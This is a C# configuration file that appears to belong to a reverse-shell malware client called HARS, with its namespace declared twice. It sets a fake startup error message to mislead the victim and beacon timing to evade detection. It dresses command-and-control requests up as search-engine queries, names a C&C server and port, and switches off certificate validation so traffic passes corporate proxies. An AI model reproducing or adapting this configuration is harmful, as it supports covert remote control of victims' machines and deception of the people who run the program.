using System;
using System.Collections.Generic;
using System.Text;

namespace HARS
{
    using System;
    using System.Collections.Generic;
    using System.Text;

    namespace HARS
    {
        class Config
        {
            /* Behavior */
            // Display a fake error msg at startup
            public static bool DisplayErrorMsg = true;
            // Title of fake error msg
            public static string ErrorMsgTitle = "This application could not be started.";
            // Description of fake error msg
            public static string ErrorMsgDesc = "Unhandled exception has occured in your application. \r\r Object {0} is not valid.";
            // Min delay between the client calls
            public static int MinDelay = 2;
            // Max delay between the client calls
            public static int MaxDelay = 5;
            // Fake uri requested - Warning : it must begin with "search" (or need a change on server side)
            public static string Url = "search?q=search+something&qs=n&form=QBRE&cvid=";
            /* Listener */
            // Hostname/IP of C&C server
            public static string Server = "https://127.0.0.1";
            // Listening port of C&C server
            public static string Port = "443";
            // Allow self-signed or "unsecure" certificates - Warning : often needed in corporate environment using proxy
            public static bool AllowInsecureCertificate = true;
        }
    }
}
